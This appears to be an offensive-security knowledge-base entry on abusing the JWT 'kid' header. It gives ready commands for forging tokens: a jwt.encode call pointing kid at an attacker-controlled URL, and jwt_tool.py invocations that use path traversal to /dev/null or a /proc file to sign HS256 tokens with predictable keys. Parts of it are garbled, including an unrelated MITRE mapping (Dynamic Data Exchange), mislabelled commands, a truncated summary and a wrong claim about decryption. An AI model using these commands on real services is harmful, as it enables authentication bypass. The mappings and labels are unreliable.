---
id: 97c16764-7e29-46d1-9d99-2bfafd3863f2
name: JWT Key ID (kid) Claim Misuse
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:00.794984+00:00'
updated_at: '2023-04-10T20:22:34.406530+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Inter-Process Communication|T1559 - Inter-Process Communication]]'
sub_techniques:
- '[[Dynamic Data Exchange|T1559.002 - Dynamic Data Exchange]]'
tags:
- '[[JWT Claims]]'
- '[[JWT - JSON Web Token]]'
- '[[JWT kid Claim Misuse]]'
commands:
- '[[Encode JWT with custom key ID header]]'
- '[[Extract JWT header]]'
- '[[Extract JWT header with kid]]'
---

# JWT Key ID (kid) Claim Misuse

## Summary

An attacker can misuse the "kid" claim of a JWT to force the use of a malicious key, which can lead to a compromise of the confidentiality and integrity of the JWT. The "kid" claim is used to identify the key used to sign a JWT, and is intended to be used to select the correct key from a set of key

## Description

# Description

An attacker can misuse the "kid" claim of a JWT to force the use of a malicious key, which can lead to a compromise of the confidentiality and integrity of the JWT. The "kid" claim is used to identify the key used to sign a JWT, and is intended to be used to select the correct key from a set of keys. However, an attacker can set the "kid" claim to a value that forces the use of a key that the attacker controls. This can allow the attacker to decrypt and modify the contents of the JWT. Business value of this attack includes access to sensitive information and resources that are protected by the JWT.

 

## Requirements

1. Access to a JWT that uses the "kid" claim.

1. Knowledge of the key used to sign the JWT.

1. Ability to intercept and modify the JWT.

 

## Defense

1. Implement proper input validation and sanitization to prevent attackers from injecting malicious values into the "kid" claim.

1. Use a secure key management system to prevent attackers from being able to control the keys used to sign JWTs.

1. Monitor for suspicious activity, such as unexpected changes to the "kid" claim of JWTs.

 

## Objectives

1. To compromise the confidentiality and integrity of the JWT.

1. To gain access to sensitive information and resources that are protected by the JWT.

 

# Instructions

1. The attacker can change the key path to the malicious key that they control, forcing the use of this key in the signing process.

 



**Code**: [[>>> jwt.encode(
...     {"some": "payload"},
...  ]]



> This command can be used to generate a new JWT with a malicious "kid" claim that points to a key controlled by the attacker.



**Command** ([[Encode JWT with custom key ID header]]):

```bash
jwt.encode({"some": "payload"}, "secret", algorithm="HS256", headers={"kid": "http://evil.example.com/custom.key"})
```



2. The attacker can change the key path to a file with a predictable content, such as /dev/null or /proc/sys/kernel/randomize_va_space, which can allow them to predict the key used to sign the JWT.

 



**Code**: [[python3 jwt_tool.py <JWT> -I -hc kid -hv "../../de]]



> This command can be used with the jwt_tool.py tool to modify the "kid" claim of a JWT to point to a file with a predictable content. This can allow the attacker to predict the key used to sign the JWT and use a key that they control to sign a new JWT.



**Command** ([[Extract JWT header]]):

```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```





**Command** ([[Extract JWT header with kid]]):

```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
```



## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]

### Techniques

- [[Inter-Process Communication|T1559 - Inter-Process Communication]]

### Sub-Techniques

- [[Dynamic Data Exchange|T1559.002 - Dynamic Data Exchange]]

## Commands Used

- [[Encode JWT with custom key ID header]]
- [[Extract JWT header]]
- [[Extract JWT header with kid]]

## Tags

- [[JWT Claims]]
- [[JWT - JSON Web Token]]
- [[JWT kid Claim Misuse]]


